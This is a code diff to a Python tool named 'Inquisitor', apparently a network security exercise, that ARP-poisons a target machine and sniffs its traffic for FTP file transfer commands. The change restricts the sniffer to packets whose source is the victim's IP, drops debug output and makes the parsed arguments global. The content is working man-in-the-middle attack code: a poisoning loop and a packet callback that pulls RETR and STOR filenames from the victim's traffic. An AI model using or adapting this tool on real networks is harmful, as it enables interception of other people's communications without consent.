@@ -1,3 +1,4 @@
+
 import argparse
 import sys
 import time
@@ -46,19 +47,14 @@ def poison_loop(ip_src, mac_src, ip_target, mac_target):
             break
 
 def ftp_sniffer(packet):
-    """A verbose callback function for debugging sniffed packets."""
-    if not packet.haslayer(TCP):
+    """Callback function for each sniffed packet to find FTP commands."""
+    # THE FIX: Only process packets coming FROM our target victim, ignore forwarded packets.
+    if not packet.haslayer(IP) or packet[IP].src != args.ip_target:
         return
-
-    # Announce any packet on the FTP control port for debugging
-    print(f". (TCP packet seen: {packet.summary()})", flush=True)
 
     if packet.haslayer(Raw):
         try:
             payload = packet[Raw].load.decode("utf-8", errors="ignore").strip()
-            if payload:
-                print(f"    -> Payload: '{payload}'", flush=True)
-            
             if payload.upper().startswith("RETR ") or payload.upper().startswith("STOR "):
                 print(f"\n[+] FTP Filename detected: {payload}\n", flush=True)
         except Exception:
@@ -66,6 +62,8 @@ def ftp_sniffer(packet):
 
 def main():
     """Main function."""
+    # Make args global so the sniffer can access ip_target
+    global args
     args = parse_args()
     
     print(f"[*] Starting Inquisitor...")
